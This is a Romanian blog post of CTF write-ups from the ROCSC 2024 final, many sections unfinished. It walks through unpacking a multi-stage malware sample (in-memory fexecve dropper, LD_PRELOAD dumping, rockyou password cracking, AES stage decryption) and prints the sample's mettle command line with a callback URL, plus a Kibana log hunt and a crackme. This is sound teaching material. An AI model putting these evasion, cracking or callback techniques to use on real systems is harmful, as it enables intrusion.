---
title: 'Rezolvări Olimpiada de Securitate Cibernetică / finala ROCSC 2024'
Enunt: 'Rezolvări pentru problemele de Jeopardy si Attack/Defense de la finala ROCSC 2024'
date: 2024-06-02T00:00:00Z
---

In acest blog voi prezenta rezolvarile pentru problemele de Jeopardy si Attack/Defense de la finala ROCSC 2024. Voi incerca sa prezint atat rezolvarile, cat si metodologia prin care am ajuns la acestea. 

Aceasta a fost ultima mea editie, deci sper ca materialele prezentate sa fie de folos pentru viitorii participanti. Atat pentru OSC/ROCSC, cat si pentru competitiile internationale ([ECSC](https://ecsc.eu/), [ICC](https://ecsc.eu/icc/), etc).

# Cuprins

* [**--- Jeopardy OSC + ROCSC ---**](#jeopardy)
* [volatile-mal (300 pts, 11 solves) - Reverse Engineering](#volatile-mal)
* [difficult-situation (51 pts, 117 solves) - Threat hunting](#difficult-situation)
* [discover-the-secret-inside (52 pts, 64 solves) - Forensics, Incident Response](#discover-the-secret-inside)
* [shift (50 pts, 65 solves) - Reverse Engineering](#shift)
* [richnotes (350 pts, 9 solves) - Web](#richnotes)
* [solve-this (267 pts, 13 solves) - Cryptography](#solve-this)
* [spanzuratoarea (467 pts, 1 solve) - Pwn](#spanzuratoarea)
* [zero-shot (50 pts, 34 solves) - ML/AI](#zero-shot)
* [**--- Jeopardy ROCSC ---**](#jeopardy-rocsc)
* [keylogger (433 pts, 7 solves) - Network](#keylogger)
* [magic (467 pts, 3 solves) - Pwn](#magic)
* [decrypt-this (483 pts, 1 solve) - Cryptography](#decrypt-this)
* [**--- Baraj / Attack & Defense ROCSC ---**](#attack-defense)
* [eeeinvoice - A/D](#eeeinvoice)
* [lazypeoninn - A/D](#lazypeoninn)

<a name="jeopardy"></a>
# Jeopardy

Inainte de a vorbi despre probleme, vreau sa mentionez cateva lucruri despre concursurile CTF de tip Jeopardy. O sa ma axez pe partea practica, deoarece nu as putea acoperi toate aspectele teoretice intr-un singur articol.

In principiu, un concurs de tip Jeopardy este doar un concurs in care participantii trebuie sa rezolve o multime de probleme pregatite de organizatori. Cand spunem ca rezolvam o problema, este suficient sa obtinem un rezultat numit **flag**, care este de obicei un sir de caractere ce are o anumita forma (de exemplu, `CTF{sha256}`). Platformele de concurs iti ofera si feedback in timp real, deci stii daca ai obtinut flag-ul corect sau nu. <br> In plus, la multe concursuri poti vedea si clasamentul in timp real, pentru a stii cum te clasezi fata de alti participanti.

Un lucru fain este ca nu conteaza cum am ajuns la rezultat, ci doar ca l-am obtinut. Ceea ce este destul de diferit fata de alte concursuri sau olimpiade, unde se acorda punctaj si pentru *modalitatea de rezolvare*, sau problemele sunt facute in asa mod incat exista doar un singur mod de rezolvare. **Creativitatea** este importanta, si nu ne putem baza pe invatarea unui algoritm universal pentru a rezolvarea problemelor.

Un alt lucru important este **gestionarea timpului**. Nu exista punctaje partiale, deci chiar daca am fost foarte aproape sa rezolvam o problema, cat timp nu obtinem flag-ul nu o sa primim niciun punct. In principiu, acest lucru se invata doar cu experienta. Dar daca ar fi sa dau un sfat, as spune ca cel mai mult m-a ajutat sa incerc sa lucrez la cat mai multe probleme *in paralel*. Astfel incat daca este o problema pe care stiu sa o rezolv si trebuie doar sa o implementez, pot sa ma gandesc in subconstient la rezolvarea altor probleme.

In multe astfel de concursuri, problemele au **punctaj dinamic**: toate problemele incep cu acelasi numar de puncte, dar punctele acelei probleme scad pe masura ce alti participanti o rezolva. Aici intervine si partea de **strategie** la care trebuie sa ne gandim: problemele grele au mai multe puncte, dar necesita si mai mult timp. Asadar, trebuie sa ne gandim daca vrem sa alocam timp pentru ele sau ne concentram pe problemele mai usoare.

Cele mai intalnite categorii de probleme sunt:
* **Web** - vulnerabilitati de securitate in aplicatii web
* **Reverse Engineering** - dezasamblare, decompilare, analiza de cod si intelegere a unui program fara acces la codul sursa
* **Cryptography** - criptare, decriptare, analiza de cifruri implementate gresit
* **Pwn** - exploatare de vulnerabilitati de securitate in aplicatiile native (de obicei cele scrise in C/C++)
* **Forensics** - analiza de fisiere, trafic de retea, capturi de memorie, etc
* **Misc** - probleme care nu se incadreaza in nicio alta categorie. Nu mereu au treaba cu securitatea, dar necesita cunostinte tehnice

Pentru concursurile individuale, este important sa avem cunostinte generale despre toate aceste categorii. Dar pentru concursurile de echipa, este important sa avem membrii cu expertiza in fiecare domeniu, din cauza punctajului dinamic.

<a name="volatile-mal"></a>
## volatile-mal (300 pts, 11 solves) - Reverse Engineering

Enunt:
```
Mi-a fost promis un tort, dar am primit un ransomware. Mi-au luat până și colecția de muzică rock. :(

Scop: Binarul conține mai multe executabile criptate/encodate. Găsiți ultimul binar, iar flag-ul se va găsi în User-Agent.

Advertisment: Tratează fișierul ca și un malware. Nu rula executabilul direct pe computerul tau, ci creează o mașină virtuală pentru a rezolva acest exercițiu! AUTORII NU SUNT RESPONSABILI ÎN NICI UN CAZ PENTRU NICIO SOLICITATIE, DAUNE SAU ALTE RASPUNDERI.

Disclaimer: Treat the file as a malware. Do not run the binary directly on your computer, instead create a virtual machine to solve this challenge! IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY.
```

Inainte sa incepem a rezolva orice problema, este important sa citim cu atentie enuntul, titlul si categoria pentru a obtine indicii care ne pot ajuta sa rezolvam problema. In cazul de fata, reverse engineering + malware ne indica ca va trebui sa analizam (cel mai probabil) un binar executabil.

Primim un binar numit `poly`. Este bine totusi ca mereu sa verificam tipul fisierului primit cu comanda `file`:
```
$ file poly
poly: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ce1a857a7b95699164ae7e5085392079ff5006c3, for GNU/Linux 3.2.0, stripped
```

Deci este un binar executabil de Linux, arhitectura x86 pe 64 de biti. Urmatorul pas este sa folosim un tool de dezasamblare pentru a analiza codul executabil. Personal, recomand folosirea `IDA` fata de `Ghidra` sau `Binary Ninja`, deoarece ne va face viata mai usoara prin calitatea decompilarii.

`IDA` este gratis pentru x86 pe 32/64 de biti, si foloseste un decompilator in cloud. Pentru alte arhitecturi putem folosi `Ghidra`, care este un tool gratis si open-source, oferit de NSA.

Bun, deschidem binarul in IDA si mergem catre functia main. Apasam F5 si vedem codul decompilat:

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  void *v3; // r12
  __int64 v4; // rbp
  char *envp; // [rsp+8h] [rbp-60h] BYREF
  char *argv[4]; // [rsp+10h] [rbp-58h] BYREF
  char v8[24]; // [rsp+30h] [rbp-38h] BYREF
  unsigned __int64 v9; // [rsp+48h] [rbp-20h]

  v9 = __readfsqword(0x28u);
  v3 = (void *)sub_1390(&unk_4020);
  v4 = (unsigned int)memfd_create("sysdaemon", 0LL);
  __sprintf_chk(v8, 1LL, 20LL, "%d", v4);
  argv[1] = v8;
  argv[0] = "[kwork/99:1]";
  argv[2] = 0LL;
  envp = 0LL;
  sub_1410(v4, v3);
  fexecve(v4, argv, &envp);
  if ( v9 != __readfsqword(0x28u) )
    start();
  return 0LL;
}
```

Decompilarea arata bine, iar deoarece binarul este `dynamically linked`, avem si functiile din libc cu numele lor, deci ne scuteste de multa munca.

Ce face codul dat? Cel mai usor mi se pare sa analizez programul ignorand functiile de tip `sub_0000`, pentru a avea o privire de ansamblu.

Vedem ca prima functie apelata este `memfd_create`, care conform manualului:
```
memfd_create() creates an anonymous file and returns a file
      descriptor that refers to it.  The file behaves like a regular
      file, and so can be modified, truncated, memory-mapped, and so
      on.  However, unlike a regular file, it lives in RAM and has a
      volatile backing storage.  Once all references to the file are
      dropped, it is automatically released.
```
Pe scurt, creaza un fisier in memorie. Bun, alt indiciu, deoarece este o tactica comuna pentru malware sa aiba mai multe stagii, iar aceste stagii sa fie criptate, si decriptate in timpul executiei.

In rest, functia main seteaza parametrii si apeleaza `fexecve`, care este un fel de `execve` (executa un alt program), dar primeste un file descriptor in loc de un path catre un fisier. Deci, binarul va executa un alt binar, care va fi creat in memorie.

Asadar, deja avem niste indicii despre ce ar putea face functiile `sub_1390` si `sub_1410`. Si le putem privi si in IDA:
```c
unsigned __int8 *__fastcall sub_1390(void *src, int a2)
{
  void *v2; // rax
  unsigned __int8 *v3; // rax
  unsigned __int8 *v4; // r8
  unsigned __int8 *v5; // rdx
  unsigned __int8 *v6; // rsi
  __int64 v7; // rax

  v2 = malloc(a2);
  v3 = (unsigned __int8 *)memcpy(v2, src, a2);
  v4 = v3;
  if ( a2 > 0 )
  {
    v5 = v3;
    v6 = &v3[a2];
    do
    {
      v7 = *v5++;
      *(v5 - 1) = byte_160160[byte_160160[(unsigned __int8)__ROL1__(byte_160260[v7], 4)]];
    }
    while ( v6 != v5 );
  }
  return v4;
}

void __fastcall sub_1410(int fd, char *ptr, __int64 a3)
{
  __int64 v4; // rbx
  size_t v5; // rdx
  ssize_t v6; // rbp

  v4 = 0LL;
  do
  {
    while ( 1 )
    {
      v5 = a3 - v4;
      if ( a3 - v4 > 2147479552 )
        v5 = 2147479552LL;
      v6 = write(fd, &ptr[v4], v5);
      if ( v6 == -1 && *__errno_location() == 4 )
        break;
      v4 += v6;
      if ( v4 == a3 )
        goto LABEL_8;
    }
  }
  while ( v4 != a3 );
LABEL_8:
  free(ptr);
}
```

Ok, in acest punct avem 2 optiuni: Rescriem implementarea celor 2 functii intr-un program al nostru de Python/C (static analysis). Sau, mai rapid, putem folosi o metoda de analiza dinamica precum un debugger.

Eu totusi am ales alta cale. Revenind la programul nostru `poly` si faptul ca este `dynamically linked`, asta inseamna ca functia `fexecve` nu exista de fapt in binar, ci este o functie din libc care va fi incarcata in timpul rularii programului de catre loader. <br> In Linux, ne putem folosi de `LD_PRELOAD` pentru a inlocui functia `fexecve` cu una proprie, care sa salveze rezultatul din acel file descriptor intr-un fisier.

```c
// Cod generat de ChatGPT
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>

int fexecve(int fd, char *const argv[], char *const envp[]) {
    printf("fexecve called\n");

    // Dump the contents of the file descriptor to "part2"
    char buffer[4096];
    ssize_t bytes;
    int part2_fd = open("part2", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (part2_fd == -1) {
        perror("open part2");
        return -1;
    }

    // Move to the beginning of the file descriptor
    lseek(fd, 0, SEEK_SET);

    // Read from fd and write to part2
    while ((bytes = read(fd, buffer, sizeof(buffer))) > 0) {
        if (write(part2_fd, buffer, bytes) != bytes) {
            perror("write to part2");
            close(part2_fd);
            return -1;
        }
    }
    close(part2_fd);

    // Move back to the beginning of the file descriptor
    lseek(fd, 0, SEEK_SET);

    printf("Dumped the contents of the file descriptor to part2\n");
    printf("Exiting...\n");
    exit(0);
}
```

Trebuie doar sa compilam acest cod ca un shared object (biblioteca) prin comanda:
```
$ gcc -shared -fPIC -o libintercept.so intercept.c -ldl
```

Si sa executam programul `poly` cu `LD_PRELOAD` setat la calea catre biblioteca noastra:
```
$ LD_PRELOAD=./libintercept.so ./poly
fexecve called
Dumped the contents of the file descriptor to part2
Exiting...
```

Desigur, intr-un caz real, nu as recomanda sa rulam un binar necunoscut pe calculatorul nostru. Mai ales pentru ca nu am analizat programul complet, si este posibil ca acesta sa faca si alte lucruri inaintea functiei `main`. Dar intr-un concurs, orice metoda care ne salveaza timpul este binevenita.

Okay, am obtinut `part2`, rulam din nou `file` sa vedem ce tip de fisier este:
```
$ file part2
part2: Python script, ASCII text executable, with very long lines (64966)
```

`file` ne spune ca este un fisier de tip Python, deci putem folosi un editor de text (VSCode/vim) pentru a-l deschide si a vedea continutul.

Structura programului este urmatoarea:
```python
#!/usr/bin/python3
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
import hashlib
import crypt
import setproctitle
from hmac import compare_digest
import os
import base64
import sys
setproctitle.setproctitle('[nfsd]')
os.close(int(sys.argv[1],10))
salt = b'asdfghjklqwertyu'
iv = b'0988765432112345'
mypass = input()
mycry= chr(36)+'1'+chr(36)+'rKtzCK9l'+chr(36)+'jywBrw3Ci9jh5zK52B3/f0'
sys.exit() if not compare_digest(mycry,crypt.crypt(mypass,mycry)) else None
key = hashlib.pbkdf2_hmac('sha256', mypass.encode('utf-8'), salt, 100000, 32)
enc_msg = base64.b64decode(b'3Y0tpXf93jTzCXI/I3GQqyXX6MCWIw9SgdGj7F5Mp06SrKBNSY9tcGybNpZTUjUYHE7FWnXAVc2mk5fRwblQcfKZ05tLkXpUD') # un base64 foarte lung
fd=os.memfd_create('[kwork/99:1]',0)
fn='/proc/self/fd/'+str(fd)
with open(fn,'wb') as g: g.write(pay)
os.execl(fn,fn)
```

Programul cere o parola, o verifica folosind `crypt.crypt` (functie de hashing), si daca parola este corecta, decripteaza stagiul urmator folosind `AES` cu o cheie derivata din parola. Deci, trebuie sa gasim parola pentru a putea avansa cu rezolvarea problemei.

O sa revin la ce am spus la inceput, anume ca enuntul problemei deseori ascunde indicii importante. In cazul de fata, `Mi-a fost promis un tort, dar am primit un ransomware. Mi-au luat până și colecția de muzică rock. :(` din enunt este un indiciu ca parola este se regaseste in colectia de parole `rockyou.txt`. (aceasta este doar o ipoteza, nu inseamna *neaparat* ca parola se va regasi in aceasta colectie, si uneori se intampla sa credem ca parti din enunt sunt indicii cand de fapt nu sunt, dar este totusi o ipoteza valida si trebuie sa o verificam).

Avem astfel primul topologie de problema care se regaseste in mai multe categorii, si anume *bruteforce*. In acest caz, avem 2 optiuni: folosim un tool specializat pentru asta (de ex hashcat), sau ne scriem noi propriul script de bruteforce. In timpul concursului am ales sa scriu un script de bruteforce in Python, care sa ruleze pe toate core-urile folosind `multiprocessing`. (in plus, consider ca este un skill important de a sti sa scrii propriile scripturi de bruteforce, deoarece in multe cazuri nu putem folosi tool-uri specializate).

```python
import crypt
import multiprocessing
from multiprocessing import Pool

mycry= chr(36)+'1'+chr(36)+'rKtzCK9l'+chr(36)+'jywBrw3Ci9jh5zK52B3/f0'
i = 0

# Read passwords from rockyou.txt
passwords = []
for password in open('rockyou.txt', 'rb').readlines():
    try:
        passwords.append(password.strip().decode())
    except UnicodeDecodeError:
        pass

print(f"Total passwords loaded: {len(passwords)}")

# Define the worker function
def check_password(password):
    if crypt.crypt(password, mycry) == mycry:
        print(f"Password found: {password}")
        return True
    return False

def main():
    with Pool(32) as p:
        result = p.map(check_password, passwords)
        if any(result):
            print("Password cracked successfully.")
        else:
            print("Password not found.")

if __name__ == "__main__":
    main()
```

Lasam script-ul sa ruleze, si in acest timp ne putem concentra pe alte probleme (nu stam sa pierdem timp uitandu-ne la terminal, nu o sa-l faca sa ruleze mai repede). 

Script-ul s-a terminat si am gasit parola `acest000id111este222securizat333`. Stim ca parola este folosita pentru a decripta acel base64 prin AES, deci putem scrie un script de Python care sa faca asta (practic ce am gasit in part2, dar fara sa si executam binarul):

```python
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

x = open('b64','r').read()

import base64

enc_msg = base64.b64decode(x)

mypass = 'acest000id111este222securizat333'

salt = b'asdfghjklqwertyu'
iv = b'0988765432112345'
key = hashlib.pbkdf2_hmac('sha256', mypass.encode('utf-8'), salt, 100000, 32)

pay = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(enc_msg), AES.block_size)

open('part3', 'wb').write(pay)
```

Desigur, rulam comanda `file` pentru a vedea ce tip de fisier este `part3`:
```bash
$ file part3
part3: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), static-pie linked, with debug_info, not stripped
```

Si avem iar de a face cu un binar. Daca il deschidem in IDA, o sa vedem ca este un binar complex cu mii de functii. Asadar, in cazul de fata, cel mai simplu este sa incercam sa vedem daca putem gasi flag-ul cu `strings`, pentru a nu pierde timp analizand codul.

```bash
$ strings part3 | grep CTF
mettle -U "TYtji7XTYf+edph0+DMxkQ==" -G "AAAAAAAAAAAAAAAAAAAAAA==" -u "https://127.0.0.1:12312/7soSKNhkUQW2o7Ch0OYZRAlA7q-vi16LBcoLNylkFX0YrS3mXA6__qNlVSC|--ua 'Mozilla/5.0 CTF{cbbd0c7297c67db7bc3c0e4faec3c057d2fa0afe3eb058e439a40e88b5ee7a32}'" -d "0" -o "" -b "0"
```

Si da, am obtinut flag-ul, fara sa mai stam sa analizam `part3`. Flag-ul a fost in User Agent, asa cum a fost precizat in enunt.

<a name="difficult-situation"></a>
## difficult-situation (51 pts, 117 solves) - Threat hunting

Enunt:
```
Investighează alertele de pe acest sistem compromis folosind Elasticsearch și ajută-ne să obținem răspunsurile necesare pentru a rezolva acest incident de securitate.

Pentru a obține acces la datele colectate, selectează Kibana -: Discover -: și alege 2018 ca și an de start pentru setarea timeframe-ului.
```

Problema de forensics. Avem la dispozitie o instanta de Kibana, unde putem cauta in loguri. In general, Kibana si Elasticsearch sunt folosite impreuna cu Logstash pentru a forma ELK Stack, care poate fi folosit ca si un SIEM (Security Information and Event Management). Un SIEM este un sistem care colecteaza date de la diferite surse si le transforma intr-un format pe care il putem analiza prin query-uri. Cu aceste query-uri putem sa cream dashboard-uri, alerte, si sa investigam incidente de securitate. Cel mai important lucru atunci cand lucram cu un SIEM este sa selectam intervalul de timp corect, asa cum este mentionat si in enunt.

Avem 3 intrebari la care trebuie sa raspundem. 

1. Q1. Identifică IP-ul mașinii compromise. 
* Din dashboard, putem filtra prin interfata grafica pentru evenimente care contin IP sursa / desinatie. Pentru ca este vorba despre o masina compromisa, putem presupune ca este vorba despre un eveniment ce contine un IP privat (10.x.x.x, 192.168.x.x, 172.16.x.x). Intr-un eveniment gasim IP-ul **10.1.30.102** care este si primul flag.
2. Q2. Unele evenimente din Kibana au status code 200. Identifică IP-ul sursă a acestor evenimente.
* Ne folosim iar de interfata grafica din Kibana si selectam doar evenimentele care au status code 200. Deoarece nu sunt chiar atat de multe evenimente in log-uri si nu avem o limita de incercari, putem sa incercam IP-urile sursa ca flag, pana gasim IP-ul **198.105.244.64** corect
3. Q3. Identifică URL path-ul folosit ăn atac. 
* Revenim iar la interfata grafica si filtram evenimentele care contin path in URL. Vedem ca sunt foarte putine evenimente rezultate, si primul rezultat este chiar flag-ul: **/ceva/**

<a name="discover-the-secret-inside"></a>
## discover-the-secret-inside (52 pts, 64 solves) - Forensics, Incident Response

Enunt:
```
Una din stațiile de lucru din infrastructura noastră a fost compromisă. Te rog să ne ajuți cu câteva informații.
```

TODO:

<a name="shift"></a>
## shift (50 pts, 65 solves) - Reverse Engineering

Enunt:
```
Se dă un binar în C care execută un algoritm în spate.

Să se identifice algoritmul din spate folosind tehnici de Reverse Engineering.

Flag format: CTF{sha256}
```

O problema introductiva in Reverse Engineering. Ca intotdeauna, incepem prin a rula `file` pe fisier:
```
$ file shift
shift: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=eca2a55a7350099798618cf194225d617659da21, for GNU/Linux 3.2.0, stripped
```

Deci un binar de Linux, arhitetura x86 pe 64 de biti. Dynamically linked, si fara simboluri (stripped). Deschidem binarul in IDA si vedem codul decompilat:

```c
__int64 __fastcall main(__int64 argc, char **argv, char **envp)
{
  char v4[32]; // [rsp+10h] [rbp-50h] BYREF
  char v5[24]; // [rsp+30h] [rbp-30h] BYREF
  __int16 v6; // [rsp+48h] [rbp-18h]
  unsigned __int64 v7; // [rsp+58h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  sub_11A9();
  if ( (_DWORD)argc == 2 )
  {
    strcpy(v4, "QeeanXKkk[ZRS]\\NBUQJ^RUL");
    v4[25] = 0;
    *(_QWORD *)v5 = 0x908070605040302LL;
    *(_QWORD *)&v5[8] = 0x11100F0E0D0C0B0ALL;
    *(_QWORD *)&v5[16] = 0x1918171615141312LL;
    v6 = 0;
    if ( strlen(argv[1]) == 25 && (unsigned int)sub_124A(argv[1], v4, v5) )
      return 0LL;
    else
      return 0LL;
  }
  else
  {
    puts("[+] We need one more argument");
    return 0xFFFFFFFFLL;
  }
}
```

Am modificat semnatura functiei main, astfel incat sa stim unde avem de-a face cu argc si argv. Vedem ca programul verifica sa fie rulat cu 2 argumente. Si chiar daca ambele cazuri din if returneaza 0, putem sa presupunem ca trebuie sa satisfacem conditia `strlen(argv[1]) == 25 && (unsigned int)sub_124A(argv[1], v4, plus_key)`.

Cand rezolvam probleme de rev, este bine sa notam orice pare suspect. In cazul de fata, avem acest string de 25 de caractere in v4: `strcpy(v4, "QeeanXKkk[ZRS]\\NBUQJ^RUL");`. Iar al 26-lea caracter este setat manual sa fie NULL (adica 0). Cealalta variabila suspecta este `v5`, care contine 3 valori de 8 bytes. Aceasta este doar o optimizare facuta de compilator. `v5` este o cheie care este folosita in functia `sub_124A`. Dar compilatorul a decis sa mute valorile cheii cate 8 bytes pentru a fi mai eficient. Cu toate acestea, pattern-ul este destul de evident cand privim in hex, pentru ca fiecare byte este reprezentat de 2 caractere hex.

Okay, acum sa vedem ce face functia `sub_124A`:
```c
__int64 __fastcall sub_124A(char *a1, char *a2, char *a3)
{
  int v4; // [rsp+24h] [rbp-4h]

  v4 = 0;
  do
  {
    if ( a2[v4] + a3[v4] != a1[v4] )
      return 0LL;
    ++v4;
  }
  while ( a2[v4] && a1[v4] );
  return 1LL;
}
```

Folosim hotkey-ul `N` in IDA si redenumim asa: a1 in argv1, a2 in str (v4 din main) si a3 (v5 din main) in key, v4 in i. Astfel, codul devine mult mai usor de citit:
```c
__int64 __fastcall sub_124A(char *argv1, char *str, char *key)
{
  int i; // [rsp+24h] [rbp-4h]

  i = 0;
  do
  {
    if ( str[i] + key[i] != argv1[i] )
      return 0LL;
    ++i;
  }
  while ( str[i] && argv1[i] );
  return 1LL;
}
```

Deci trebuie doar sa adunam key cu str si vom obtine parola. Pentru a nu ne complica cu transcrisul lui v5 in Python, e mai simplu sa scriem un program in C care ne afiseaza argumentul corect:
```c
#include <stdio.h>
#include <string.h>

int main() {
  char v4[32];
  strcpy(v4, "QeeanXKkk[ZRS]\\NBUQJ^RUL");
  v4[25] = 0;
  char plus_key[24];

  *(long long int *)plus_key = 0x908070605040302LL;
  *(long long int *)&plus_key[8] = 0x11100F0E0D0C0B0ALL;
  *(long long int *)&plus_key[16] = 0x1918171615141312LL;

  for (int i=0;i<24;i++) {
    v4[i] = v4[i] + plus_key[i];
  }
  printf("%s\n", v4);

}
```

Compilam si rulam programul:
```
$ gcc solve.c -o solve
$ ./solve
Shift_Stuff_all_The_time
```

Ne conectam cu netcat la server si introducem parola:
```
$ nc ip port
```

Si primim flag-ul **CTF{f157c4bb8fabb5788ec40e544d29513c3f5166499231efe94db5c4f4dc245c8c}**

<a name="richnotes"></a>
## richnotes (350 pts, 9 solves) - Web

Enunt:
```
Ceva este suspicios cu această aplicație de luat notițe.

Flag format: CTF{sha256}
```

TODO: 

<a name="solve-this"></a>
## solve-this (267 pts, 13 solves) - Cryptography

Enunt:
```
Poți te rog să rezolvi acest exercițiu pentru mine?

Flag format: flag{sha256}
```

TODO: 

<a name="spanzuratoarea"></a>
## spanzuratoarea (467 pts, 1 solve) - Pwn

Enunt:
```
Ai învățat până acum cum să joci Spânzurătoarea?
```

TODO: 

<a name="zero-shot"></a>
## zero-shot (50 pts, 34 solves) - ML/AI

Enunt:
```
Sunt foarte curios cum Inteligența Artificială o să ne transforme viața în viitorul apropiat. 

Dacă ești interesat să îți povestesc mai multe, obține secretul din fișierele primite și îți voi zice tot ce vrei să știi.

Target: http://142.93.100.92:19417/
```

TODO: 

<a name="jeopardy-rocsc"></a>
# Jeopardy ROCSC

Niste probleme putin mai grele date doar concurentilor care au participat la ROCSC.

<a name="keylogger"></a>
## keylogger (433 pts, 7 solves) - Network

Enunt:
```
Analizează fișierul primit și obține secretul.

Flag format: CTF{sha256}
```

TODO: 

<a name="magic"></a>
## magic (467 pts, 3 solves) - Pwn

Enunt:
```
Se dă un binar scris în limbajul de programare C. 

Să se identifice vulnerabilitatea prezentă în binar și să se obțină flag-ul.

Identificați valoarea "magică" ca să puteți obține manipularea executiei codului.

Flag format: CTF{sha256}
```

TODO: e faina rezolvarea

<a name="decrypt-this"></a>
## decrypt-this (483 pts, 1 solve) - Cryptography

Enunt:
```
Tocmai ce ai primit câteva date encriptate și cheile necesare pentru a le decripta. Știind că mecanismul folosit este RSA-PKCS, iar PIN-ul are doar 5 cifre, cum ai putea decripta datele primite?

Flag format: CTF{sha256}
```

TODO: 

<a name="attack-defense"></a>
# Attack & Defense

O introducere lunga despre Attack & Defense. Tool-uri folosite, strategii, etc.

<a name="eeeinvoice"></a>
## eeeinvoice - A/D

TODO:

<a name="lazypeoninn"></a>
## lazypeoninn - A/D

TODO: